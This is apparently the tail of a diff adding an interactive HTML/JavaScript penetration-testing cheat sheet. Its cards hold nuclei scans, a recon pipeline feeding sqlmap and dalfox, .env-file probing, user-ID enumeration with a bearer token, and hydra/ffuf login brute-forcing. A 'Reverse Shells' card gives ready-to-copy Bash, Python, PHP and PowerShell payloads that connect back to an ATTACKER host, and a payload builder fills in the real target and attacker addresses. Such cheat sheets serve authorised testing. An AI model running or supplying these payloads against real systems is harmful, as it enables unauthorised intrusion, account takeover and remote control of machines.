+<div class="cmd" onclick="cp(this)">nuclei -l targets.txt -t exposures/ -t misconfiguration/ -t default-logins/ -o all.txt</div>
+<div class="cmd" onclick="cp(this)">nuclei -u https://TARGET -tags sqli,xss,ssrf,rce,lfi -severity critical,high</div>
+<div class="cmd" onclick="cp(this)">nuclei -update-templates &amp;&amp; nuclei -u https://TARGET -t new-templates/</div>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="tb2">
+  <div class="card-hd"><span class="ctitle">Burp Suite Extensions</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb2','na',this)">N/A</button></div><span class="sev si">PROXY</span></div>
+  <div class="card-bd">
+<table class="dtbl">
+<thead><tr><th>Extension</th><th>Use Case</th></tr></thead>
+<tbody>
+<tr><td class="mono">Turbo Intruder</td><td>Race conditions, fast fuzz</td></tr>
+<tr><td class="mono">HTTP Request Smuggler</td><td>CL.TE / TE.CL detect</td></tr>
+<tr><td class="mono">Param Miner</td><td>Cache poison, hidden params</td></tr>
+<tr><td class="mono">JWT Editor</td><td>JWT alg confusion attacks</td></tr>
+<tr><td class="mono">InQL</td><td>GraphQL testing</td></tr>
+<tr><td class="mono">AuthMatrix</td><td>IDOR matrix testing</td></tr>
+<tr><td class="mono">Hackvertor</td><td>Encoding transforms</td></tr>
+<tr><td class="mono">Collaborator Everywhere</td><td>OOB via all headers</td></tr>
+<tr><td class="mono">ActiveScan++</td><td>Extended passive scan</td></tr>
+</tbody>
+</table>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="tb3">
+  <div class="card-hd"><span class="ctitle">Recon Automation Pipeline</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb3','na',this)">N/A</button></div><span class="sev si">PIPELINE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">subfinder -d TARGET -silent | httpx -silent -o alive.txt &amp;&amp; nuclei -l alive.txt -t cves/ -t exposures/ -t misconfiguration/ -o results.txt &amp;&amp; katana -list alive.txt -jc -o endpoints.txt &amp;&amp; cat endpoints.txt | gf sqli | sqlmap --batch -m - &amp;&amp; cat endpoints.txt | gf xss | dalfox pipe</div>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="tb4">
+  <div class="card-hd"><span class="ctitle">Power One-Liners</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb4','na',this)">N/A</button></div><span class="sev si">ONELINERS</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">subfinder -d TARGET -silent | httpx -silent | gau | urldedupe | anew params_urls.txt</div>
+<div class="cmd" onclick="cp(this)">echo "TARGET" | gau | grep "=" | dalfox pipe -o xss.txt</div>
+<div class="cmd" onclick="cp(this)">subfinder -d TARGET -silent | httpx -silent -path "/.env" -mc 200 -o env_files.txt</div>
+<div class="cmd" onclick="cp(this)">for i in $(seq 1 500); do curl -s "https://api.TARGET/user/$i" -H "Authorization: Bearer TOKEN" | jq -r '.email' 2&gt;/dev/null; done</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="tb5">
+  <div class="card-hd"><span class="ctitle">Reverse Shells</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb5','na',this)">N/A</button></div><span class="sev sc">POST-EXPLOIT</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)"># Bash
+bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1
+# Python3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# PHP
+php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+# PowerShell
+powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2&gt;&amp;1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length)}"</div>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="tb6">
+  <div class="card-hd"><span class="ctitle">Shell Upgrade + SecLists</span><div class="card-prog"><button class="cp-btn" onclick="markCard('tb6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('tb6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('tb6','na',this)">N/A</button></div><span class="sev si">POST-EXPLOIT</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">python3 -c 'import pty;pty.spawn("/bin/bash")'</div>
+<div class="cmd" onclick="cp(this)">script /dev/null -c bash</div>
+<div class="cmd" onclick="cp(this)">rlwrap nc -lvnp PORT</div>
+<div class="note">After PTY: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm</div>
+<table class="dtbl" style="margin-top:8px;">
+<thead><tr><th>WordList</th><th>Use</th></tr></thead>
+<tbody>
+<tr><td class="mono" style="font-size:9px">raft-medium-directories.txt</td><td>Dir brute</td></tr>
+<tr><td class="mono" style="font-size:9px">subdomains-top1million-5000.txt</td><td>Subdomains</td></tr>
+<tr><td class="mono" style="font-size:9px">LFI-Jhaddix.txt</td><td>LFI paths</td></tr>
+<tr><td class="mono" style="font-size:9px">burp-parameter-names.txt</td><td>Params</td></tr>
+<tr><td class="mono" style="font-size:9px">api/api-endpoints.txt</td><td>API routes</td></tr>
+</tbody>
+</table>
+  </div>
+</div>
+</div>
+</div>
+
+<!-- MISSING SECTIONS STUBS -->
+<div id="sec-enum" class="section">
+<div class="shdr"><div class="sico">📡</div><div><div class="stitle">ENUMERATION</div><div class="sdesc">// parameter discovery — vhost — login brute force — header analysis</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep done" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Recon Done</div></div>
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Param Discovery</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">VHost Enum</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Header Analysis</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">Login Brute</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Auth Mapping</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="cgrid">
+<div class="card" data-sev="medium" data-id="en1">
+  <div class="card-hd"><span class="ctitle">Parameter Discovery</span><div class="card-prog"><button class="cp-btn" onclick="markCard('en1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('en1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('en1','na',this)">N/A</button></div><span class="sev sm">ENUM</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">arjun -u https://TARGET/endpoint -m GET</div>
+<div class="cmd" onclick="cp(this)">arjun -u https://TARGET/api -m POST --headers "Authorization: Bearer TOKEN"</div>
+<div class="cmd" onclick="cp(this)">ffuf -u "https://TARGET/?FUZZ=test" -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fw 10</div>
+  </div>
+</div>
+<div class="card" data-sev="medium" data-id="en2">
+  <div class="card-hd"><span class="ctitle">VHost + Login Brute Force</span><div class="card-prog"><button class="cp-btn" onclick="markCard('en2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('en2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('en2','na',this)">N/A</button></div><span class="sev sm">ACTIVE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">ffuf -u http://1.2.3.4 -H "Host: FUZZ.TARGET" -w WORDLIST -fw 100</div>
+<div class="cmd" onclick="cp(this)">hydra -l admin -P WORDLIST TARGET http-post-form "/login:username=^USER^&amp;password=^PASS^:Invalid"</div>
+<div class="cmd" onclick="cp(this)">ffuf -u https://TARGET/login -X POST -d "user=admin&amp;pass=FUZZ" -w WORDLIST -fr "Invalid"</div>
+  </div>
+</div>
+</div>
+</div>
+
+</div><!-- /content -->
+</div><!-- /app -->
+
+<!-- EXPORT BUTTON -->
+<button id="export-btn" onclick="exportPDF()">⬇ EXPORT PDF</button>
+
+<!-- KEYBOARD SHORTCUT HINT -->
+<div id="kbd-hint">
+  <kbd>/</kbd> Search &nbsp;
+  <kbd>Esc</kbd> Clear &nbsp;
+  <kbd>1</kbd>-<kbd>9</kbd> Jump section<br>
+  <kbd>c</kbd> Copy last hover &nbsp;
+  <kbd>p</kbd> Print mode<br>
+  <kbd>f</kbd> Focus findings
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+
+// ── PATHWAY NAVIGATION ──
+function stepClick(stepEl) {
+  var pathway = stepEl.closest('.pathway');
+  if (!pathway) return;
+  var steps = Array.from(pathway.querySelectorAll('.pstep'));
+  var idx = steps.indexOf(stepEl);
+  steps.forEach(function(s, i) {
+    s.classList.remove('current', 'done');
+    if (i < idx) s.classList.add('done');
+    else if (i === idx) s.classList.add('current');
+  });
+  var lbl = stepEl.querySelector('.ps-lbl');
+  if (lbl) vapt_toast('▶ ' + lbl.textContent);
+}
+
+function pathPrev(btn) {
+  var pathway = btn.parentNode.querySelector('.pathway');
+  if (!pathway) return;
+  var steps = Array.from(pathway.querySelectorAll('.pstep'));
+  var cur = -1;
+  steps.forEach(function(s,i){ if(s.classList.contains('current')) cur = i; });
+  if (cur <= 0) { vapt_toast('Already at step 1'); return; }
+  stepClick(steps[cur - 1]);
+}
+
+function pathNext(btn) {
+  var pathway = btn.parentNode.querySelector('.pathway');
+  if (!pathway) return;
+  var steps = Array.from(pathway.querySelectorAll('.pstep'));
+  var cur = -1;
+  steps.forEach(function(s,i){ if(s.classList.contains('current')) cur = i; });
+  if (cur === -1) cur = 0;
+  if (cur >= steps.length - 1) { vapt_toast('Last step reached ✓'); return; }
+  stepClick(steps[cur + 1]);
+}
+
+function vapt_toast(msg) {
+  var old = document.getElementById('vt');
+  if (old) old.remove();
+  var el = document.createElement('div');
+  el.id = 'vt';
+  el.textContent = msg;
+  el.style.cssText = 'position:fixed;bottom:24px;right:24px;background:#0f2035;border:1px solid #00d4ff;border-radius:5px;padding:9px 16px;font-family:Share Tech Mono,monospace;font-size:11px;color:#00d4ff;z-index:9999;letter-spacing:1px;pointer-events:none;transition:opacity .3s;';
+  document.body.appendChild(el);
+  setTimeout(function(){ el.style.opacity='0'; setTimeout(function(){ if(el.parentNode) el.remove(); },300); }, 1700);
+}
+
+// ── GLOBALS ──
+var lastHovered = null;
+var findings = [];
+var progress = {};
+var currentSev = 'all';
+var sections = ['recon','enum','sqli','xss','xxe','ssti','idor','csrf','upload','api','graphql','jwt','adv','cloud','ws','bizlogic','cve','toolbox'];
+
+// ── PAYLOAD BUILDER ──
+function applyBuilder() {
+  var target = document.getElementById('pb-target').value.trim() || 'target.com';
+  var attacker = document.getElementById('pb-attacker').value.trim() || 'ATTACKER_IP';
+  var port = document.getElementById('pb-port').value.trim() || '4444';
+  var param = document.getElementById('pb-param').value.trim() || 'id';
+  var wordlist = document.getElementById('pb-wordlist').value.trim() || '/opt/SecLists/...';
+  document.querySelectorAll('.cmd, .payload').forEach(function(el) {
+    var orig = el.getAttribute('data-orig');
+    if (!orig) { orig = el.textContent; el.setAttribute('data-orig', orig); }
+    var t = orig;
+    t = t.replace(/TARGET/g, target);
+    t = t.replace(/ATTACKER/g, attacker);
+    t = t.replace(/PORT/g, port);
+    t = t.replace(/PARAM/g, param);
+    t = t.replace(/WORDLIST/g, wordlist);
+    el.textContent = t;
+  });
+  var st = document.getElementById('pb-status');
+  st.style.opacity = 1;
+  setTimeout(function(){ st.style.opacity = 0; }, 2000);
+}
+
+// ── SEVERITY FILTER ──
+function filterSev(sev, btn) {
+  currentSev = sev;
+  document.querySelectorAll('.sf-btn').forEach(function(b){ b.classList.remove('active'); });
+  btn.classList.add('active');
+  document.querySelectorAll('.card').forEach(function(card) {
+    var csev = card.getAttribute('data-sev');
+    if (sev === 'all') { card.classList.remove('hidden-by-filter'); }
+    else { card.classList.toggle('hidden-by-filter', csev !== sev); }
+  });
+}
+
+// ── NAVIGATION ──
+function show(id, el) {
+  document.querySelectorAll('.section').forEach(function(s){ s.classList.remove('active'); });
+  document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
+  var sec = document.getElementById('sec-' + id);
+  if (sec) {
+    sec.classList.add('active');
+    // Restore correct step group visibility for this section
+    var pathway = sec.querySelector('.pathway');
+    if (pathway) {
+      var steps = pathway.querySelectorAll('.pstep');
+      var currentIdx = 0;
+      steps.forEach(function(s, i) { if (s.classList.contains('current')) currentIdx = i; });
+      showStepGroup(sec, currentIdx);
+    }
+  }
+  if (el) el.classList.add('active');
+  document.getElementById('content').scrollTop = 0;
+  if (currentSev !== 'all') { filterSev(currentSev, document.querySelector('.sf-btn[data-sev="'+currentSev+'"]')); }
+}
+
+// ── COPY ──
+function cp(el) {
+  lastHovered = el;
+  var txt = el.getAttribute('data-orig') || el.textContent;
+  if (el.classList.contains('cmd')) txt = txt.replace(/^\$\s/, '');
+  navigator.clipboard.writeText(txt).then(function() {
+    var f = document.createElement('span');
+    f.className = 'cf'; f.textContent = 'COPIED';
+    el.appendChild(f);
+    setTimeout(function(){ if(f.parentNode) f.parentNode.removeChild(f); }, 1100);
+  }).catch(function() {
+    var ta = document.createElement('textarea');
+    ta.value = txt; ta.style.cssText = 'position:fixed;opacity:0;';
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+}
+document.querySelectorAll('.cmd,.payload').forEach(function(el){
+  el.addEventListener('mouseenter', function(){ lastHovered = el; });
+});
+
+// ── PROGRESS TRACKING ──
+function markCard(id, state, btn) {
+  var card = btn.closest('.card');
+  var btns = card.querySelectorAll('.cp-btn');
+  btns.forEach(function(b){ b.classList.remove('tested','vuln','na'); });
+  if (progress[id] === state) { delete progress[id]; }
+  else { progress[id] = state; btn.classList.add(state); }
+  saveProgress();
+  updateProgressBar();
+}
+
+function updateProgressBar() {
+  var cards = document.querySelectorAll('.card[data-id]');
+  var total = cards.length;
+  var done = Object.keys(progress).length;
+  document.getElementById('prog-text').textContent = done + ' / ' + total + ' tested';
+  document.getElementById('prog-bar-fill').style.width = (total ? Math.round(done/total*100) : 0) + '%';
+  sections.forEach(function(sec) {
+    var secCards = document.querySelectorAll('#sec-'+sec+' .card[data-id]');
+    var secTotal = secCards.length; if (!secTotal) return;
+    var secDone = 0;
+    secCards.forEach(function(c){ if(progress[c.getAttribute('data-id')]) secDone++; });
+    var np = document.getElementById('np-'+sec);
+    if (np) np.style.width = Math.round(secDone/secTotal*100) + '%';
+  });
+}
+
+function restoreProgress() {
+  try {
+    var saved = localStorage.getItem('vapt_progress');
+    if (saved) progress = JSON.parse(saved);
+  } catch(e) {}
+  Object.keys(progress).forEach(function(id) {
+    var btns = document.querySelectorAll('[data-id="'+id+'"] .cp-btn');
+    btns.forEach(function(b){
+      if ((b.textContent === '✓' && progress[id]==='tested') ||
+          (b.textContent === '⚠' && progress[id]==='vuln') ||
+          (b.textContent === 'N/A' && progress[id]==='na')) {
+        b.classList.add(progress[id]);
+      }
+    });
+  });
+  updateProgressBar();
+}
+
+function saveProgress() {
+  try { localStorage.setItem('vapt_progress', JSON.stringify(progress)); } catch(e) {}
+}
+
+// ── FINDINGS ──
+function renderFindings() {
+  var list = document.getElementById('fplist');
+  list.innerHTML = '';
+  if (!findings.length) {
+    var li = document.createElement('li');
+    li.className = 'fp-empty'; li.textContent = 'No findings yet.';
+    list.appendChild(li); return;
+  }
+  findings.forEach(function(f, i) {
+    var li = document.createElement('li'); li.className = 'fp-item';
+    var dot = document.createElement('span'); dot.className = 'fp-dot d'+f.sev;
+    var txt = document.createElement('span'); txt.textContent = f.text; txt.style.flex='1'; txt.style.wordBreak='break-word';
+    var del = document.createElement('span'); del.className = 'fp-del'; del.textContent = '✕';
+    (function(idx){ del.onclick = function(){ findings.splice(idx,1); saveFindings(); renderFindings(); }; })(i);
+    li.appendChild(dot); li.appendChild(txt); li.appendChild(del);
+    list.appendChild(li);
+  });
+}
+function addFinding() {
+  var inp = document.getElementById('fp-text');
+  var sev = document.getElementById('fp-sev');
+  var text = inp.value.trim(); if (!text) return;
+  findings.push({text:text, sev:sev.value});
+  inp.value = ''; saveFindings(); renderFindings();
+}
+function clearFindings() {
+  if (!findings.length) return;
+  if (confirm('Clear all findings?')) { findings = []; saveFindings(); renderFindings(); }
+}
+function saveFindings() { try { localStorage.setItem('vapt_findings', JSON.stringify(findings)); } catch(e) {} }
+function loadFindings() {
+  try { var s = localStorage.getItem('vapt_findings'); if (s) findings = JSON.parse(s); } catch(e) {}
+  renderFindings();
+}
+document.getElementById('fp-text').addEventListener('keydown', function(e){ if(e.key==='Enter') addFinding(); });
+
+// ── SEARCH ──
+document.getElementById('search').addEventListener('input', function() {
+  var q = this.value.toLowerCase().trim();
+  document.querySelectorAll('.card').forEach(function(card) {
+    if (!q) { card.style.display=''; return; }
+    card.style.display = card.textContent.toLowerCase().includes(q) ? '' : 'none';
+  });
+});
+document.getElementById('search').addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') { this.value = ''; document.querySelectorAll('.card').forEach(function(c){c.style.display='';}); }
+});
+
+// ── KEYBOARD SHORTCUTS ──
+var kbdTimeout;
+function showKbd() {
+  var h = document.getElementById('kbd-hint');
+  h.classList.add('show');
+  clearTimeout(kbdTimeout);
+  kbdTimeout = setTimeout(function(){ h.classList.remove('show'); }, 3000);
+}
+document.addEventListener('keydown', function(e) {
+  var tag = document.activeElement.tagName;
+  if (tag === 'INPUT' || tag === 'SELECT' || tag === 'TEXTAREA') return;
+  var secKeys = ['recon','enum','sqli','xss','xxe','ssti','idor','csrf','upload','api','graphql','jwt','adv','cloud','ws','bizlogic','cve','toolbox'];
+  if (e.key === '/') {
+    e.preventDefault(); document.getElementById('search').focus();
+  } else if (e.key === 'Escape') {
+    document.getElementById('search').blur();
+  } else if (e.key === 'c' && lastHovered) {
+    cp(lastHovered);
+  } else if (e.key === 'p') {
+    window.print();
+  } else if (e.key === 'f') {
+    document.getElementById('fp-text').focus();
+  } else if (e.key === '?' || e.key === 'h') {
+    showKbd();
+  } else if (!isNaN(parseInt(e.key)) && parseInt(e.key) >= 1) {
+    var idx = parseInt(e.key) - 1;
+    if (idx < secKeys.length) {
+      var targetSec = secKeys[idx];
+      var navEl = document.querySelector('.nav-item[data-sec="'+targetSec+'"]');
+      show(targetSec, navEl);
+    }
+  }
+});
+
+// ── PATHWAY STEP GROUPS INIT ──
+// After DOM ready, wrap each mhd+cgrid pair into step-group divs per section
+function initStepGroups() {
+  document.querySelectorAll('.section').forEach(function(sec) {
+    var pathway = sec.querySelector('.pathway');
+    if (!pathway) return;
+    var steps = pathway.querySelectorAll('.pstep');
+    if (!steps.length) return;
+
+    // Collect all mhd elements inside this section
+    var mhds = sec.querySelectorAll('.mhd');
+    var stepCount = steps.length;
+
+    // Assign each mhd+cgrid pair a step index (round-robin if more content than steps)
+    mhds.forEach(function(mhd, i) {
+      var stepIdx = Math.min(i, stepCount - 1);
+      mhd.setAttribute('data-step-group', stepIdx);
+      // Also tag the immediately following cgrid sibling(s)
+      var next = mhd.nextElementSibling;
+      while (next && !next.classList.contains('mhd')) {
+        next.setAttribute('data-step-group', stepIdx);
+        next = next.nextElementSibling;
+      }
+    });
+
+    // If no mhds exist (single-block section), tag all cgrids sequentially
+    if (!mhds.length) {
+      var cgrids = sec.querySelectorAll('.cgrid');
+      cgrids.forEach(function(cg, i) {
+        cg.setAttribute('data-step-group', Math.min(i, stepCount - 1));
+      });
+    }
+
+    // Show only step 0 initially (find the current step)
+    var currentIdx = 0;
+    steps.forEach(function(s, i) { if (s.classList.contains('current')) currentIdx = i; });
+    showStepGroup(sec, currentIdx);
+  });
+}
+
+function showStepGroup(sec, targetIdx) {
+  // Show groups up to and including targetIdx (cumulative — show all done steps + current)
+  sec.querySelectorAll('[data-step-group]').forEach(function(el) {
+    var groupIdx = parseInt(el.getAttribute('data-step-group'));
+    el.style.display = (groupIdx <= targetIdx) ? '' : 'none';
+  });
+}
+
+// ── PATHWAY STEP CLICK ──
+function stepClick(stepEl) {
+  var pathway = stepEl.closest('.pathway');
+  if (!pathway) return;
+  var sec = stepEl.closest('.section');
+  var steps = pathway.querySelectorAll('.pstep');
+  var clickedIdx = Array.prototype.indexOf.call(steps, stepEl);
+
+  // Update step highlight states
+  steps.forEach(function(s, i) {
+    s.classList.remove('current', 'done');
+    if (i < clickedIdx) s.classList.add('done');
+    else if (i === clickedIdx) s.classList.add('current');
+  });
+
+  // Show/hide content groups
+  if (sec) showStepGroup(sec, clickedIdx);
+}
+
+// ── PATHWAY PREV/NEXT ──
+function pathNext(btn) {
+  var wrapper = btn.closest('div[style]') || btn.parentElement;
+  var pathway = wrapper.querySelector('.pathway');
+  if (!pathway) return;
+  var steps = pathway.querySelectorAll('.pstep');
+  var currentIdx = -1;
+  steps.forEach(function(s, i) { if (s.classList.contains('current')) currentIdx = i; });
+  if (currentIdx < steps.length - 1) stepClick(steps[currentIdx + 1]);
+}
+
+function pathPrev(btn) {
+  var wrapper = btn.closest('div[style]') || btn.parentElement;
+  var pathway = wrapper.querySelector('.pathway');
+  if (!pathway) return;
+  var steps = pathway.querySelectorAll('.pstep');
+  var currentIdx = -1;
+  steps.forEach(function(s, i) { if (s.classList.contains('current')) currentIdx = i; });
+  if (currentIdx > 0) stepClick(steps[currentIdx - 1]);
+}
+
+// ── INIT ──
+restoreProgress();
+loadFindings();
+initStepGroups();
+// Set first nav item active
+document.querySelector('.nav-item[data-sec="recon"]').classList.add('active');
+
+</script>
+</body>
+</html>
